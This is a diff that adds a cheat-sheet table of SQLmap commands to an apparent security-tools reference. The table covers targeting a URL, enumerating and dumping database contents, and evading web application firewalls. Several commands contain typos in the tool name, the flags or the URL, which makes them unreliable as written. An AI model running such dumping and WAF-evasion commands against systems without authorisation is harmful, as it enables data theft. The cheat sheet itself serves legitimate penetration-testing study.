@@ -464,3 +464,24 @@ Nmap (Network Mapper) is an open-source tool used for network discovery and secu
 # What is SQLMap?
 SQLmap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications.
 
+| SQLmap | Command/Examples |
+|--------|------------------|
+| Run on a single URL | sqlmap -u "http://test.com" |
+| Run on a single parameter | sqlmap -p <parameter> -u "http://test.com" |
+| Enumerate Databases | sqlmap -u "http://test.com" --dbs |
+| Enumerate Tables | sqlmap -u "http://test.com" -D <db_name> --tables |
+| Enumerate Columns | sqlmap -u "http://test.com" -D <db_nmae> -T <table_name>  --columns |
+| Dump data | sqlmap -u "http://test.com" -D <db_name> -T <table_nmae> --dump |
+| Use a Proxy | sqlmap -u "http:/test.com" --proxy="http://proxy_ip:proxy_port" |
+| Set User Agent | sqlmpa -u "http://test.com" --user-agnet="CustomAgent" |
+| Set Level | sqlmap -u "http://test.com" --level=<level> |
+| Set Threads | sqlmap -u "http://test.com" --theads=<num> |
+| WAF Bypass | sqlmap -u "http://test.com" --tamper=<script> |
+| Exit or Error | sqlmap -u "http://test.com" --ignore-errors |
+| WAF Bypass using cookie | sqlmap -u"http://test.com" --cookie="Cookie_data" |
+| WAF Bypass using user-agent | sqlmap -u "http://test.com" --user-agent="Cuteom_agent" |
+| WAF Bypass using Refer Header | sqlmap -u "http://test.com" --refer="http://refer.com" |
+| WAF bypass with delays | sqlmap -u "http://test.com" --delay=5 |
+| WAF Bypass with Custom Payload | sqlmap -u "http://test.com" --tamper="random_case" |
+
+---
